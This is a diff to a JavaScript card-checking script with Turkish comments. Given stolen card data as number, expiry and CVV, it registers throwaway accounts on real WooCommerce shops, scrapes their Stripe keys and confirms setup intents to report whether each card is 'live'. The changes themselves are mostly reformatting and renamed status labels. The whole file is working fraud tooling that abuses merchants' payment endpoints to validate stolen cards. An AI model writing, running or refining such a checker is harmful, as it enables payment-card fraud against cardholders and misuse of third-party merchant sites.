@@ -1,5 +1,7 @@
-// auth.js - Gerçek Stripe Auth Motoru
-// Kullanım: checkCard('516874****|12|26|123')
+// ============================================================
+//  auth.js - GERÇEK STRIPE AUTH (Python kodunun JS çevirisi)
+//  Kullanım: checkCard('516874****|12|26|123')
+// ============================================================
 
 const AUTH_SITES = [
     'https://pathosceramiche.com',
@@ -8,9 +10,9 @@ const AUTH_SITES = [
 ];
 
 function randomStr(n = 8) {
-    const c = 'abcdefghijklmnopqrstuvwxyz';
+    const chars = 'abcdefghijklmnopqrstuvwxyz';
     let r = '';
-    for (let i = 0; i < n; i++) r += c[Math.floor(Math.random() * c.length)];
+    for (let i = 0; i < n; i++) r += chars[Math.floor(Math.random() * chars.length)];
     return r;
 }
 
@@ -39,7 +41,11 @@ function parseCard(input) {
 
 async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
     const ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36';
-    const headers = { 'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9' };
+    const headers = {
+        'User-Agent': ua,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9'
+    };
 
     const addPmUrl = baseUrl + '/my-account/add-payment-method/';
     const email = randomEmail();
@@ -54,9 +60,11 @@ async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
 
     let html;
     try {
-        const r1 = await fetch(addPmUrl, { method: 'POST', headers, body: regPayload });
+        const r1 = await fetch(addPmUrl, { method: 'POST', headers: headers, body: regPayload });
         html = await r1.text();
-    } catch (e) { throw new Error('Site bağlantı hatası'); }
+    } catch (e) {
+        throw new Error('Site bağlantı hatası');
+    }
 
     // Stripe Key
     const keyMatch = html.match(/pk_(?:live|test)_[a-zA-Z0-9]+/);
@@ -106,11 +114,13 @@ async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
         const json = await r2.json();
         if (r2.status !== 200) {
             const err = json.error?.message || 'Stripe hatası';
-            return { status: 'dead', msg: err };
+            return { status: 'declined', msg: err };
         }
         pmId = json.id;
-        if (!pmId) return { status: 'dead', msg: 'Payment method oluşturulamadı' };
-    } catch (e) { return { status: 'dead', msg: 'Stripe bağlantı hatası' }; }
+        if (!pmId) return { status: 'declined', msg: 'Payment method oluşturulamadı' };
+    } catch (e) {
+        return { status: 'declined', msg: 'Stripe bağlantı hatası' };
+    }
 
     // 3. WooCommerce Setup Intent Confirm
     const wcParams = new URLSearchParams({ 'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent' });
@@ -140,10 +150,10 @@ async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
             return { status: 'live', msg: '✅ Approved - Stripe Auth Success!' };
         } else {
             const errMsg = json.data?.error?.message || json.data?.message || 'Setup Intent Failed';
-            return { status: 'dead', msg: '❌ ' + errMsg };
+            return { status: 'declined', msg: '❌ ' + errMsg };
         }
     } catch (e) {
-        return { status: 'dead', msg: '❌ WooCommerce bağlantı hatası' };
+        return { status: 'declined', msg: '❌ WooCommerce bağlantı hatası' };
     }
 }
 
@@ -154,6 +164,7 @@ async function checkCard(cardInput) {
     const { pan, exp_m, exp_y, cvv } = parsed;
     const cleanCard = `${pan}|${exp_m}|${exp_y}|${cvv}`;
 
+    // Siteleri karıştır
     const sites = [...AUTH_SITES];
     for (let i = sites.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
@@ -164,17 +175,20 @@ async function checkCard(cardInput) {
         try {
             const result = await checkCardOnSite(site, pan, exp_m, exp_y, cvv);
             if (result.status === 'live') {
-                return `✅ LIVE: ${cleanCard} - ${result.msg}`;
+                return `✅ Approved - Stripe Auth Success! (${cleanCard})`;
             } else {
-                return `❌ DEAD: ${cleanCard} - ${result.msg}`;
+                return `❌ Declined - ${result.msg} (${cleanCard})`;
             }
         } catch (e) {
             continue;
         }
     }
-    return `⚠️ HATA: ${cleanCard} - Tüm siteler başarısız`;
+    return `⚠️ Error - Tüm siteler başarısız (${cleanCard})`;
 }
 
+// ============================================================
+//  EXPORT
+// ============================================================
 if (typeof module !== 'undefined' && module.exports) {
     module.exports = { checkCard };
 }
